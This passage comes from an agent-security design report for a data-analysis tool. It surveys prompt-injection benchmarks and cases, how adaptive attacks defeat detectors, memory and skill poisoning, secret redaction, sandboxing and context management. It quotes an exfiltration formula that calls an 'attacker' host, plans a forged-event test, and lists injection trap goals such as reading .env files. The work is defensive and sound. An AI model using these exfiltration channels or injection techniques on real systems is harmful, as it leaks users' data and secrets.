| **Rule of Two** | [Meta AI, 2025-10-31](https://ai.meta.com/blog/practical-ai-agent-security/) | Per session, at most two of: untrustworthy inputs, sensitive data or systems, state change or external communication | Design discipline, inspired by [Chromium's Rule of 2](https://chromium.googlesource.com/chromium/src/+/main/docs/security/rule-of-2.md) |
| **Lethal trifecta** | [Willison, 2025-06-16](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/) | Private data + untrusted content + external communication means exfiltration | "95% is very much a failing grade"; avoid the combination |

### 3.3 Benchmarks

- **AgentDojo** ([arXiv 2406.13352](https://arxiv.org/abs/2406.13352), 2024-06-19, v3 2024-11-24; [repo](https://github.com/ethz-spylab/agentdojo) MIT, 955 stars, last push 2026-06-02):
  - 97 tasks and 629 security test cases.
  - Measures both utility under attack and targeted attack success rate. The best template for crivo's traps.
- **InjecAgent** ([arXiv 2403.02691](https://arxiv.org/abs/2403.02691), ACL Findings 2024; [repo](https://github.com/uiuc-kang-lab/InjecAgent) MIT, 180 stars, last push 2024-07-02, dormant):
  - 1,054 cases, 17 user tools and 62 attacker tools.
  - ReAct GPT-4 was vulnerable 24% of the time; a "hacking prompt" nearly doubles that.
- **BIPIA** (Microsoft): archived. **Open-Prompt-Injection** ([repo](https://github.com/liu00222/Open-Prompt-Injection)) is a general toolkit.
- **Tabular or CSV injection: no benchmark found** (searches on 2026-10-23). The closest evidence is field reports:
  - **CellShock** ([PromptArmor](https://www.promptarmor.com/resources/cellshock-claude-ai-is-excel-lent-at-stealing-data), tests on 11/18 and 11/24 of 2025).
    - The injection was blue-on-blue text in an imported sheet.
    - It led Claude for Excel to write `IMAGE("https://attacker/?data=<summary>")`.
    - The later variant hid the data in invisible Unicode. The human-in-the-loop modal "does not appear to be fail-proof".
  - **Ramp Sheets AI**: same class, fixed 2026-03-16 ([PromptArmor](https://www.promptarmor.com/resources/ramp-sheets-ai-exfiltrates-financials)).
  - **PandasAI CVE-2024-12366** (prompt to arbitrary Python, [CERT VU#148244](https://kb.cert.org/vuls/id/148244)).
  - **Vanna.AI CVE-2024-5565** (prompt injection replaces Plotly code run through `exec`, [JFrog, 2024-06](https://jfrog.com/blog/prompt-injection-attack-code-execution-in-vanna-ai-cve-2024-5565/)).
  - These two CVEs are the closest analogues to crivo's architecture.

### 3.4 What actually works (2025-2026 evidence)

- **Prompt-level and detector defences fail against adaptive attackers.**
  - "The Attacker Moves Second" (Nasr, Carlini, Tramèr et al., [arXiv 2510.09023](https://arxiv.org/abs/2510.09023), 2025-10-10) measured:
    - Spotlighting and Prompt Sandwiching above 95% (search attack, AgentDojo);
    - MetaSecAlign 96% (originally reported 2%);
    - Protect AI, PromptGuard and Model Armor detectors above 90%; PIGuard 71%;
    - MELON 76-95%;
    - Data Sentinel bypassed in every case;
    - Circuit Breakers 100% (HarmBench).
  - "human red-teaming succeeds in all the cases we evaluated".
- **The 2026 surveys agree.**
  - A coding-assistant SoK ([arXiv 2601.17548](https://arxiv.org/abs/2601.17548), 2026-01-24, 78 studies, 42 techniques): adaptive attacks "exceed 85%" against state-of-the-art defences, and most of the 18 defences reviewed mitigate less than 50%.
  - [arXiv 2602.10453](https://arxiv.org/abs/2602.10453) (2026-02): no single approach gets trustworthiness, utility and latency at once [med].
  - [arXiv 2606.26479](https://arxiv.org/abs/2606.26479): deterministic enforcement outside the model is the "convergent strategy" [med, abstract only].
- **What holds up: capability limits enforced outside the model.**
  - No network, read-only data, writes confined, and no secrets in reach.
  - Plus deterministic checks on anything the model claims (crivo's referee).
  - Plus provable flow control (CaMeL, FIDES) where the utility cost (about 7 points on AgentDojo for CaMeL) is acceptable.
  - Model-side training cuts attack success a lot (Anthropic: 1.4% with safeguards against an adaptive browser attacker), but not to zero.
- **For crivo:**
  - The kernel can't be put behind CaMeL: the model has to write arbitrary pandas code over untrusted data. That is the code-then-execute pattern without the constraint.
  - So the defensible claim is that **injection can make crivo propose something wrong, but it can't exfiltrate, can't persist outside the workspace, and can't get a wrong fix admitted**. The OS sandbox, the out-of-kernel referee, output-channel hardening and skill provenance together deliver that.

### 3.5 Persistence: memory and skill poisoning

- **MINJA** ([arXiv 2503.03704](https://arxiv.org/abs/2503.03704), NeurIPS 2025): poisons agent memory through ordinary queries. Reported injection success above 95% [med].
- **MemoryGraft** ([arXiv 2512.16962](https://arxiv.org/abs/2512.16962)): trigger-free poisoning through normal ingestion [med].
- **The coding-assistant SoK** lists skill-based architectures as a distinct attack surface.
- **Implication**: SKILL.md content must not carry free text derived from data, and admission must re-verify independently. crivo already re-verifies admission and refuses changed scripts (4a96863).

---

## 4. Secret and PII redaction libraries

| Library | Licence | Lang / embed | Stars · last push | Status | Fit for crivo |
|---|---|---|---|---|---|
| **Yelp/detect-secrets** | Apache-2.0 | Python, in-process (plugins: entropy, AWS, private keys, JWT, …) | 4,654 · 2026-04-02 | Last release **v1.5.0 (2024-05-06)**; slow | **Best in-process fit.** Pure Python and MIT-compatible. Pin the version; plugins can be called on strings |
| **gitleaks/gitleaks** | MIT | Go binary; rules in TOML (RE2 regexes) | 30,278 · 2026-10-23 | v8.30.1 (2026-03-21). README: "feature complete ... security patches only", focus moved to Betterleaks | **Port a curated rule subset** (MIT) to Python `re`. Don't ship the binary |
| **betterleaks/betterleaks** | MIT | Go | 2,323 · 2026-10-22 (created 2026-02-03) | Active; v2 in development; by the gitleaks authors | Watch it; its rules are MIT |
| **trufflesecurity/trufflehog** | **AGPL-3.0** | Go; 800+ detectors with live verification | 28,676 · 2026-10-24 UTC | Very active | **Don't vendor or embed (AGPL).** Live verification calls the network anyway |
| **mongodb/kingfisher** | Apache-2.0 | Rust | 1,272 · 2026-10-20 | Active | Rule source, if needed |
| **praetorian-inc/noseyparker** | Apache-2.0 | Rust | 2,338 · archived | Archived | No |
| **mazen160/secrets-patterns-db** | **CC-BY-SA-4.0** | YAML regex DB | 1,622 · 2025-08-06 | Slow | Share-alike: don't copy into an MIT tree |
| **Presidio** (now `data-privacy-stack/presidio`, formerly `microsoft/presidio`) | MIT | Python; NER through spaCy or transformers plus regex recognisers; `presidio-structured` for tables | 11,485 · 2026-10-19; analyzer 2.2.364 (2026-07-22) | Active | Too heavy for the default path (spaCy model download, import weight against "import-light"). Optional extra, or borrow recognisers (Luhn, IBAN checksum) |
| **scrubadub** | Apache-2.0 (GitHub) / MIT (PyPI): conflicting | Python | 433 · 2023-09-01 | **Unmaintained** (2.0.1, 2023-09) | No |
| **protectai/llm-guard** | MIT | Python | 3,218 · archived | Archived | No |

**Technique that beats all of them for crivo's known secrets: exact-value masking.**
- crivo knows the values it loaded (provider keys, anything in `.env`). Masking those exact strings, plus base64 and URL-encoded forms, in everything leaving the kernel is high-precision.
- GitHub Actions does the same and warns: "Because there are multiple ways a secret value can be transformed, this redaction is not guaranteed" ([docs](https://docs.github.com/en/actions/concepts/security/secrets)).
- Layer pattern rules on top for secrets crivo doesn't know: AWS keys, private keys, JWTs, GitHub and Slack tokens, high-entropy strings near `key`/`token`/`secret`.

---

## 5. Context engineering for long agent sessions

### 5.1 Anthropic guidance and APIs (primary)

- **"Effective context engineering for AI agents"** ([2025-09-29](https://www.anthropic.com/engineering/effective-context-engineering-for-ai-agents)):
  - Aim for "the smallest possible set of high-signal tokens".
  - Just-in-time retrieval through lightweight references.
  - Compaction: tune the prompt for recall first, then precision.
  - "One of the safest lightest touch forms of compaction is tool result clearing."
  - Structured note-taking and sub-agents.
- **Context editing** ([docs](https://platform.claude.com/docs/en/build-with-claude/context-editing)):
  - Beta header `context-management-2025-06-27`.
  - `clear_tool_uses_20250919` takes `trigger` (default 100k input tokens), `keep` (default 3 tool uses), `clear_at_least` (so cache invalidation pays for itself), `exclude_tools` and `clear_tool_inputs`.
  - `clear_thinking_20251015`; and the memory tool `memory_20250818`, which warns before clearing.
- **Compaction** ([overview](https://platform.claude.com/docs/en/build-with-claude/compaction)):
  - On demand: `compact-2026-09-04`, the recommended option.
  - At a threshold: `compact-2026-01-12` with edit `compact_20260112`, default trigger 150k tokens, minimum 50k, custom `instructions`, `pause_after_compaction` ([docs](https://platform.claude.com/docs/en/build-with-claude/compaction-threshold)).
  - **Claude-only, beta.** crivo's default provider is `deepseek` (`llm.py:138`), with `openai`-compatible and `claude` options. A portable, client-side mechanism is needed regardless.
- **Code execution with MCP** ([2025-11-04](https://www.anthropic.com/engineering/code-execution-with-mcp)):
  - "intermediate results stay in the execution environment by default".
  - "The agent sees five rows instead of 10,000."
  - 150,000 to 2,000 tokens (98.7%).
  - PII is tokenised before it reaches the model.
  - "Running agent-generated code requires a secure execution environment with appropriate sandboxing."
- **Programmatic tool calling** ([2025-11-24](https://www.anthropic.com/engineering/advanced-tool-use)):
  - "Average usage dropped from 43,588 to 27,297 tokens" (37%).
  - "200KB of raw expense data to just 1KB of results."

### 5.2 Independent evidence

- **Observation masking vs summarisation** (JetBrains Research; Lindenbauer et al.; [arXiv 2508.21433](https://arxiv.org/abs/2508.21433) v1 2025-08-29, v3 2025-10-27; NeurIPS'25 DL4C).
  - Setup: masking replaces observations older than M=10 turns with a placeholder and keeps all reasoning and actions.
  - Qwen3-Coder 480B: 54.8% at $0.61, against raw 53.4% at $1.29 and LLM-summary 53.8% at $0.64.
  - Gemini 2.5 Flash: masking 35.6% at $0.18, against summary 36.0% at $0.24.
  - Summaries **lengthened trajectories** (Gemini: 52 turns against 44). A hybrid cut a further 7-11%.
- **Context rot** (Chroma; Hong, Troynikov, Huber; [2025-07-14](https://www.trychroma.com/research/context-rot)).
  - Across 18 models, performance "varies significantly as input length changes, even on simple tasks"; one distractor hurts.
  - Coherent haystacks are harder than shuffled ones.
- **Manus** (Yichao Ji, [2025-07-18](https://manus.im/blog/Context-Engineering-for-AI-Agents-Lessons-from-Building-Manus)):
  - KV-cache hit rate is the key metric, so keep the prefix stable and the context append-only.
  - Mask tools, don't remove them. Use the file system as context.
  - "Our compression strategies are always designed to be restorable."
  - Recite goals (todo.md) and "leave the wrong turns in the context".
- **Recursive Language Models** (Zhang, Kraska, Khattab; blog 2025-10 [med on exact day]; [arXiv 2512.24601](https://arxiv.org/abs/2512.24601) v1 2025-12-31, v3 2026-05-11, NeurIPS 2026; [repo](https://github.com/alexzhang13/rlm) MIT, 5,713 stars, last push 2026-09-24, v0.1.3).
  - The REPL is "pre-loaded with the context as a variable", and the root LM "never directly sees the entire context".
  - Handles inputs "up to two orders of magnitude beyond model context windows".
  - Median gains on GPT-5: about 26% over compaction and 13% over Claude Code.
  - Caveats: latency (seconds to minutes) and cost variance.
  - The repo's default REPL is host `exec`. It warns this "can be problematic if the prompts or tool calls can interact with malicious users", which is exactly crivo's threat model.
- **Observation clipping in practice.** Codex truncates tool output from the middle with a marker and a token budget (`truncate_middle_with_token_budget` in [codex-rs/utils/string](https://github.com/openai/codex/tree/main/codex-rs/utils/string)). It keeps head and tail, where errors and results live [high].

### 5.3 Two context risks specific to crivo (inference [high])

1. **Summaries launder injection.** An LLM-written compaction summary can copy injected instructions out of tool output into what later reads as trusted session state. Treat summaries as untrusted, or better, build the post-compaction state from crivo's structured records.
2. **Masking breaks prompt caches.** DeepSeek and Anthropic both cache prefixes. Mask or clear in batches, as `clear_at_least` and Manus advise, not one observation per turn.

---

## 6. What crivo should do (ranked)

Effort: S is a day or less, M is a few days, L is a week or more. Licence notes are against crivo's MIT.

### 1. Close the inherited-stdout path and authenticate protocol frames
- **Serves:** the forged-event bug.
- **What:**
  - `km.start_kernel(stdout=DEVNULL, stderr=<kernel.stderr.log>)`.
  - A per-session 32-byte key, sent on stdin in `hello` (not argv or env).
  - Each event carries `seq` and an HMAC-SHA256 `mac`; the host drops unauthenticated or out-of-order lines and counts them.
  - Linux: `prctl(PR_SET_DUMPABLE, 0)` in the supervisor.
  - The first test: a cell doing `os.write(sys.stdout.fileno(), b'{"id": …}\n')` must not reach a queue.
- **Source:** crivo `supervisor.py:129` and `client.py:296-307`; jupyter_client [launcher.py](https://github.com/jupyter/jupyter_client/blob/main/jupyter_client/launcher.py); ipykernel [iostream.py](https://github.com/ipython/ipykernel/blob/main/ipykernel/iostream.py); [ptrace(2)](https://man7.org/linux/man-pages/man2/ptrace.2.html); [MCP stdio](https://modelcontextprotocol.io/specification/latest/basic/transports/stdio).
- **Effort:** S.
- **Licence:** stdlib only.
- **Platforms:** macOS, Linux, Windows (the key and fd changes; prctl is Linux only).
- **Risk:** low. Kernel fd-level prints vanish from the terminal (they still reach IOPub). Docker mode: the same change applies inside the container.

### 2. OS sandbox at the existing Docker seam, policy ported from srt and Codex into Python
- **Serves:** the OS sandbox, and injection containment.
- **What:**
  - A third transport: the supervisor argv is prefixed with `bwrap …` (Linux) or `sandbox-exec -p <generated SBPL>` (macOS).
  - Network: none. Linux uses `--unshare-net`, with ZMQ on the private loopback. macOS uses ZMQ `transport="ipc"` in the kernel folder, allows only those socket paths and denies `network*`; it should **not** open localhost.
  - Reads: system, the interpreter and venv, and the data file(s) read-only. Deny `$HOME`, `~/.ssh` and `.env` explicitly.
  - Writes: only the kernel folder. Set `HOME`, `TMPDIR`, `IPYTHONDIR`, `MPLCONFIGDIR` and `XDG_CACHE_HOME` to it.
  - bwrap flags: `--die-with-parent --new-session --unshare-pid/ipc/uts --unshare-user --disable-userns --cap-drop ALL`, plus a seccomp filter against userns creation and `io_uring`, as srt and Codex do.
  - **Fail closed** when the sandbox can't start, the opposite of Claude Code's default. Offer `srt` as an optional backend when it is on PATH.
- **Source:** [srt](https://github.com/anthropics/sandbox-runtime); [Codex linux-sandbox](https://github.com/openai/codex/tree/main/codex-rs/linux-sandbox); [Codex seatbelt_base_policy.sbpl](https://github.com/openai/codex/blob/main/codex-rs/sandboxing/src/seatbelt_base_policy.sbpl); [bubblewrap](https://github.com/containers/bubblewrap); [Claude Code sandboxing](https://code.claude.com/docs/en/sandboxing).
- **Effort:** M for Linux; M for macOS, plus a spike on ZMQ IPC under Seatbelt.
- **Licence:** Apache-2.0 snippets are fine; keep the attribution and NOTICE. bwrap (LGPL) is exec'd, not linked.
- **Platforms:** macOS and Linux. Windows stays on `--docker` or WSL2.
- **Risk:**
  - sandbox-exec is deprecated, though still used by Chrome, Codex and Claude Code.
  - Ubuntu 24.04 AppArmor blocks unprivileged userns (CI needs the sysctl).
  - Interpreter-path discovery with uv.
  - On macOS it is a policy boundary, not a VM.

### 3. Move every verdict out of the model's kernel
- **Serves:** the forged-event bug (in-process tampering), and the trust claim.
- **What:** the referee, admission and verify run in a fresh short-lived process under the same sandbox. It loads the persisted artifact and the fix source, never runs model cells, and returns structured JSON that the host validates.
- **Source:** [Chromium mojo.md](https://chromium.googlesource.com/chromium/src/+/main/docs/security/mojo.md) and [Rule of 2](https://chromium.googlesource.com/chromium/src/+/main/docs/security/rule-of-2.md); the [Design Patterns paper](https://arxiv.org/abs/2506.08837) (plan-then-execute, code-then-execute); crivo's strict xfails (4835b24).
- **Effort:** M. It touches `loop.py` (core): Aarmen reviews.
- **Licence:** n/a.
- **Platforms:** all.
- **Risk:** latency (process start plus a parquet reload) and RAM on the Mac (two pandas processes). Mitigate by running them in sequence and keeping them short-lived.

### 4. Memory watchdog
- **Serves:** the memory limit.
- **What:**
  - In the supervisor, psutil polls the kernel process tree every 100-250 ms. On crossing the cap it kills the kernel and emits a typed `memory_cap` event.
  - macOS: prefer `phys_footprint` where available.
  - Linux: also try `systemd-run --user --scope -p MemoryMax=… -p MemorySwapMax=0` for a hard cap.
  - Don't rely on `RLIMIT_AS`: macOS doesn't enforce it, and Linux allocators reserve large ranges.
- **Source:** [Fast Downward issue825](https://ai-fast-downward.dmi.unibas.ch/issue825) [med]; [Arch wiki cgroups](https://wiki.archlinux.org/title/Control_groups) [med]; [nsjail](https://github.com/google/nsjail).
- **Effort:** S-M.
- **Licence:** psutil is BSD-3.
- **Platforms:** macOS and Linux (the watchdog also works on Windows).
- **Risk:** the polling race on fast allocations; the cgroup path missing without systemd.

### 5. Output-boundary redaction
- **Serves:** redaction.
- **What:** at the supervisor-to-host boundary, before transcripts, logs or the model:
  1. Exact-value masking of every secret crivo loaded, including base64 and URL-encoded forms.
  2. Pattern and entropy detection: detect-secrets plugins in-process, or a curated port of gitleaks rules.
  3. Count the redactions in the session log; never alter the data itself.
- **Source:** [GitHub Actions secrets](https://docs.github.com/en/actions/concepts/security/secrets); [detect-secrets](https://github.com/Yelp/detect-secrets); [gitleaks](https://github.com/gitleaks/gitleaks).
- **Effort:** S-M.
- **Licence:** detect-secrets Apache-2.0 and gitleaks rules MIT are fine. **Don't use TruffleHog (AGPL-3.0) or secrets-patterns-db (CC-BY-SA)** in-tree. Keep Presidio (MIT) optional.
- **Platforms:** all.
- **Risk:** false positives on hex IDs and hashes in model-visible output. detect-secrets' last release is 2024-05.

### 6. Injection trap suite, with deterministic oracles from the sandbox
- **Serves:** injection traps (the instrument comes before items 7, 9 and 10).
- **What:**
  - AgentDojo-style scoring: utility under attack plus targeted attack success rate.
  - Carriers: column, sheet and file names, cell text that reaches samples or top values, exception text, and report and notebook text.
  - Goals: exfiltration (connect or read `.env`), integrity (claim verified, suppress a finding, alter a fix), and persistence (into SKILL.md).
  - Include ADI payloads that mimic crivo's own finding and receipt formats, Unicode-tag smuggling, and **adaptive** variants (search or rewrite loops).
  - Score from sandbox denials and the referee, not from model self-report.
  - Per AGENTS.md this is an `eval` issue for the eval-author.
- **Source:** [AgentDojo](https://arxiv.org/abs/2406.13352); [The Attacker Moves Second](https://arxiv.org/abs/2510.09023); [ADI](https://arxiv.org/abs/2607.05120); [CellShock](https://www.promptarmor.com/resources/cellshock-claude-ai-is-excel-lent-at-stealing-data).
- **Effort:** M.
- **Licence:** write the suite fresh. AgentDojo is MIT if anything is reused.
- **Platforms:** all.
- **Risk:** static traps overstate robustness, so the adaptive variants are required. Cost: paid runs, under the eval caps.

### 7. Close the output exfiltration channels
- **Serves:** injection containment and redaction.
- **What:**
  - Generated HTML reports and notebooks render data strings escaped.
  - They load no remote resources: add a `<meta http-equiv="Content-Security-Policy" content="default-src 'none'; img-src data:; style-src 'unsafe-inline'">`, or similar.
  - Markdown cells never embed remote image URLs built from data.
  - MCP responses carry no auto-fetching links.
  - This is the CellShock `IMAGE()` channel in crivo's own outputs.
- **Source:** [CellShock](https://www.promptarmor.com/resources/cellshock-claude-ai-is-excel-lent-at-stealing-data); [lethal trifecta](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/); [Meta Rule of Two](https://ai.meta.com/blog/practical-ai-agent-security/).
- **Effort:** S.
- **Licence:** n/a.
- **Platforms:** all.
- **Risk:** low. Check that inline charts still render (data: URIs).

### 8. Restorable clipping, then observation masking
- **Serves:** capped observations and compaction.
- **What:**
  - Clip head and tail (not head only), with an "N chars omitted" marker and the path of the full output saved in the workspace.
  - Mask cell outputs older than a window (start at M=10), keeping code and reasoning.
  - Mask in batches so prefix caches survive.
  - Provider-agnostic.
- **Source:** [JetBrains arXiv 2508.21433](https://arxiv.org/abs/2508.21433); [Manus](https://manus.im/blog/Context-Engineering-for-AI-Agents-Lessons-from-Building-Manus); [Anthropic context editing](https://platform.claude.com/docs/en/build-with-claude/context-editing); [Codex truncate](https://github.com/openai/codex/tree/main/codex-rs/utils/string).
- **Effort:** S (clipping) plus S-M (masking, in `loop.py`: core).
- **Licence:** n/a.
- **Platforms:** all.
- **Risk:** this is a behaviour change, so it needs a pre-registered eval. Masking can hide an error the model still needs; keep the latest error unmasked.

### 9. Datamark untrusted strings in the profile and observations
- **Serves:** injection traps (as a speed bump).
- **What:**
  - Emit every data-derived string as a JSON string literal inside a block fenced by a **per-session random tag**; strip or escape any occurrence of the tag in the data.
  - Strip U+E0000-E007F, bidi controls and zero-width characters, and show their presence as a finding.
  - Cap each string's length.
  - Add one system-prompt line saying the block is data.
  - Measure with item 6 and expect gains against static attacks only.
- **Source:** [Spotlighting](https://arxiv.org/abs/2403.14720); [MSRC 2025-07](https://www.microsoft.com/msrc/blog/2025/07/how-microsoft-defends-against-indirect-prompt-injection-attacks); [Unicode tags](https://blogs.cisco.com/ai/understanding-and-mitigating-unicode-tag-prompt-injection); [ADI](https://arxiv.org/abs/2607.05120).
- **Effort:** S. `prompts.py` is core.
- **Licence:** n/a.
- **Platforms:** all.
- **Risk:** it is easy to over-claim; adaptive attacks get >95% past it. Possible utility loss from escaping, so it needs an eval.

### 10. Structured compaction
- **Serves:** compaction.
- **What:**
  - On a token threshold, rebuild context from crivo's records: the user goal, the kernel variable registry, the findings ledger, verified and reverted fixes, open questions, and the last K turns verbatim.
  - Use an LLM summary only for free-form conversation, and fence it as untrusted.
  - On the `claude` provider, server compaction (`compact_20260112`, minimum trigger 50k) can be an option, but it is beta and Claude-only.
- **Source:** [Anthropic context engineering](https://www.anthropic.com/engineering/effective-context-engineering-for-ai-agents); [compaction docs](https://platform.claude.com/docs/en/build-with-claude/compaction-threshold); [JetBrains](https://arxiv.org/abs/2508.21433) (summaries lengthen runs); [RLM](https://arxiv.org/abs/2512.24601).
- **Effort:** M (`loop.py`, core).
- **Licence:** n/a.
- **Platforms:** all.
- **Risk:** a behaviour change that needs an eval. The risk is losing a detail a later turn needs; tune the prompt for recall first, per Anthropic.

### 11. Skill-library provenance against persistent injection
- **Serves:** injection traps.
- **What:**
  - SKILL.md is generated from templates and code only.
  - Data-derived identifiers appear quoted and escaped, never as prose.
  - Store the provenance (session, data fingerprint, referee result).
  - Re-verify on load and refuse skills whose text changed, as the scripts already are.
  - Add a trap that tries to write instructions into a skill.
- **Source:** [MINJA](https://arxiv.org/abs/2503.03704); [MemoryGraft](https://arxiv.org/abs/2512.16962); [coding-assistant SoK](https://arxiv.org/abs/2601.17548).
- **Effort:** S. `skills.py` and `library.py` are core.
- **Licence:** n/a.
- **Platforms:** all.
- **Risk:** low.

### 12. Later, optional: a microVM tier to replace Docker on the Mac
- **Serves:** the OS sandbox (strong boundary).
- **What:** a `--vm` transport using microsandbox or BoxLite (libkrun or Hypervisor.framework) or Apple `container`, with the same supervisor image as `--docker`.
- **Source:** [microsandbox](https://github.com/superradcompany/microsandbox); [BoxLite](https://github.com/boxlite-ai/boxlite); [Apple container](https://github.com/apple/container).
- **Effort:** L.
- **Licence:** all Apache-2.0.
- **Platforms:**
  - microsandbox: macOS Apple silicon, Linux KVM, Windows WHP.
  - BoxLite: macOS Apple silicon, Linux, WSL2.
  - Apple `container`: macOS 26 only.
- **Risk:** all are beta or new. Each VM reserves RAM (Apple's default is 1 GiB, and crivo wants 2 GiB), so on the owner's Mac it isn't cheaper than Docker. Do it after 0d.

### Don't do
- RestrictedPython, Pyodide or Deno, or WASM as the boundary (escape history; no pandas-capable kernel).
- firejail (setuid, GPL-2.0).
- Audit hooks as a boundary (PEP 578 says so).
- Cloud sandboxes (E2B, Modal, Daytona) for the default path: the data leaves the machine, and Daytona's core went private in June 2026.
- Relying on detectors (PromptGuard and the like): >90% adaptive bypass.
- Relying on Jupyter HMAC against the kernel.

### Dollar cap
Not researched beyond noting that it belongs with the loop's usage accounting. No external library is needed.

---

## 7. Open questions and unverified points

- **Not executed:** the forged-event path. The mechanism is from code reading; the first test should confirm it.
- **Untested:** ZMQ `ipc` transport under a Seatbelt profile that denies `network*` but allows specific unix-socket paths.
- **No exact figures:** macOS `RLIMIT_AS` and `RLIMIT_DATA` enforcement on macOS 15 and 26. No current Apple document; test it.
- **Secondary only:** the Opus 4.6-5 system-card injection numbers.
- **Unconfirmed:** the RestrictedPython CVE-2026-76825 fixed version (aggregators say 8.4; the PyPI latest is 8.5).
- **Unconfirmed:** whether GitHub's `ubuntu-24.04` hosted runners need the AppArmor sysctl for bwrap. Probable, but no GitHub doc found.
- **Not found:** a peer-reviewed benchmark for prompt injection through tabular data (searched 2026-10-23).
